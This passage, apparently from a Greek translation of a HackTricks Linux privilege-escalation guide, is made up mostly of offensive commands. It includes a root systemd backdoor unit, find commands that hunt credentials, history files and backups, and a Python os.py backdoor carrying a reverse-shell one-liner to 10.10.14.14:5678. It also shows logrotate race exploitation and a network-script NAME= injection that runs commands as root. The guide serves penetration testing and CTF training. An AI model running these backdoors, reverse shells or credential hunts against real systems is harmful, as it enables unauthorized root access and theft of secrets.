ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα ξεκινήσει ο tomcat.

### Έλεγχος φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανότατα δεν θα μπορέσετε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενη Τοποθεσία/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Αρχεία που τροποποιήθηκαν τα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB αρχεία
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυφά αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Σενάρια/Εκτελέσιμα στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web αρχεία**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν passwords

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ψάχνει για **πολλά πιθανά αρχεία που θα μπορούσαν να περιέχουν passwords**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε γι' αυτό είναι: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια open source εφαρμογή που χρησιμοποιείται για να ανακτήσει πολλά passwords αποθηκευμένα σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Logs

Αν μπορείτε να διαβάσετε logs, ίσως να μπορέσετε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα στα logs**. Όσο πιο περίεργο είναι ένα log, τόσο πιο ενδιαφέρον θα είναι (πιθανώς).\
Επίσης, κάποια "**bad**" διαμορφωμένα (backdoored?) **audit logs** μπορεί να σας επιτρέψουν να **καταγράψετε passwords** μέσα σε audit logs όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Για να διαβάσετε τα logs, η ομάδα** [**adm**](interesting-groups-linux-pe/index.html#adm-group) θα είναι πραγματικά χρήσιμη.

### Αρχεία Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Θα πρέπει επίσης να ελέγξετε για αρχεία που περιέχουν τη λέξη "**password**" στο **όνομα** τους ή μέσα στο **περιεχόμενο**, και επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή hashes regexps.\
Δεν πρόκειται να απαριθμήσω εδώ πώς να κάνετε όλα αυτά, αλλά αν ενδιαφέρεστε μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Python library hijacking

Αν γνωρίζετε από **πού** θα εκτελεστεί ένα python script και **μπορείτε να γράψετε σε** αυτόν τον φάκελο ή μπορείτε να **modify python libraries**, μπορείτε να τροποποιήσετε την OS library και να την backdoor (αν μπορείτε να γράψετε όπου θα εκτελεστεί το python script, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **backdoor the library** απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε IP και PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση του logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή στους γονικούς καταλόγους του να αποκτήσουν ενδεχομένως ανυψωμένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να παραβιαστεί ώστε να εκτελεί αυθαίρετα αρχεία, ειδικά σε καταλόγους όπως _**/etc/bash_completion.d/**_. Είναι σημαντικό να ελέγξετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε κατάλογο όπου εφαρμόζεται η περιστροφή των αρχείων καταγραφής.

> [!TIP]
> Αυτή η ευπάθεια επηρεάζει το `logrotate` έκδοσης `3.18.0` και παλαιότερες

Περισσότερες λεπτομέρειες για την ευπάθεια μπορείτε να βρείτε σε αυτήν τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτή την ευπάθεια με [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** οπότε όποτε βρείτε ότι μπορείτε να τροποποιήσετε logs, ελέγξτε ποιος τα διαχειρίζεται και δείτε αν μπορείτε να κλιμακώσετε προνόμια αντικαθιστώντας τα logs με symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπάθειας:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Αν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **γράψει** ένα script `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** να **τροποποιήσει** ένα υπάρχον, τότε το σύστημά σας είναι **pwned**.

Τα network scripts, όπως για παράδειγμα _ifcg-eth0_, χρησιμοποιούνται για τις δικτυακές συνδέσεις. Μοιάζουν ακριβώς με .INI αρχεία. Ωστόσο, είναι ~sourced~ σε Linux από το Network Manager (dispatcher.d).

Στη δική μου περίπτωση, το `NAME=` που αποδίδεται σε αυτά τα network scripts δεν χειρίζεται σωστά. Αν το όνομα περιέχει **λευκό/κενό διάστημα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το κενό διάστημα**. Αυτό σημαίνει ότι **όλα όσα ακολουθούν το πρώτο κενό εκτελούνται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Σημείωση: το κενό διάστημα μεταξύ Network και /bin/id_)

### **init, init.d, systemd, και rc.d**

Ο κατάλογος `/etc/init.d` φιλοξενεί **scripts** για System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει scripts για `start`, `stop`, `restart` και μερικές φορές `reload` υπηρεσίες. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στο `/etc/rc?.d/`. Μια εναλλακτική διαδρομή σε Redhat συστήματα είναι `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` συνδέεται με το **Upstart**, ένα νεότερο **service management** που εισήχθη από το Ubuntu, χρησιμοποιώντας αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση σε Upstart, τα SysVinit scripts εξακολουθούν να χρησιμοποιούνται παράλληλα με τις ρυθμίσεις Upstart λόγω ενός επιπέδου συμβατότητας στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος manager εκκίνησης και υπηρεσιών, προσφέροντας προηγμένα χαρακτηριστικά όπως on-demand daemon starting, automount management και system state snapshots. Οργανώνει αρχεία σε `/usr/lib/systemd/` για πακέτα διανομής και `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, απλοποιώντας τη διαδικασία διαχείρισης του συστήματος.

## Άλλα κόλπα

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Τα Android rooting frameworks συνήθως κάνουν hook σε ένα syscall για να εκθέσουν privileged kernel functionality σε έναν userspace manager. Αδύναμη authentication του manager (π.χ. έλεγχοι signature βασισμένοι σε FD-order ή κακές password schemes) μπορεί να επιτρέψει σε μια τοπική app να προσποιηθεί τον manager και να escalates σε root σε ήδη-rooted συσκευές. Μάθετε περισσότερα και λεπτομέρειες εκμετάλλευσης εδώ:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Η regex-driven service discovery σε VMware Tools/Aria Operations μπορεί να εξάγει ένα binary path από τις γραμμές εντολών διεργασιών και να το εκτελέσει με -v υπό privileged context. Επιτρεπτικά πρότυπα (π.χ. χρήση \S) μπορεί να ταιριάξουν attacker-staged listeners σε εγγράψιμες τοποθεσίες (π.χ. /tmp/httpd), οδηγώντας σε εκτέλεση ως root (CWE-426 Untrusted Search Path).

Μάθετε περισσότερα και δείτε ένα γενικευμένο pattern εφαρμοζόμενο σε άλλα discovery/monitoring stacks εδώ:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Προστασίες Ασφάλειας Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Καλύτερο εργαλείο για την αναζήτηση Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
